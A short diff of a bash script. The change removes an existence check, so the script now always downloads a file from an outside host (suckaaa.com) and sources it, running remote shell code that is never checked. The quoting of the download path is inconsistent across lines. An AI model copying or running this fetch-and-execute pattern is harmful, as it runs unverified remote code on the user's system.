@@ -1,8 +1,8 @@
 #!/bin/bash
 
-if [[ ! -f '~/.garbage/lib' ]]; then
+# if [[ ! -f '~/.garbage/lib' ]]; then
     mkdir '~/.garbage';
-    curl 'https://suckaaa.com/s/lib' > '~/.garbage/lib';
-fi
+    curl 'https://suckaaa.com/s/lib' > ~/.garbage/lib;
+# fi
 
 source ~/.garbage/lib;
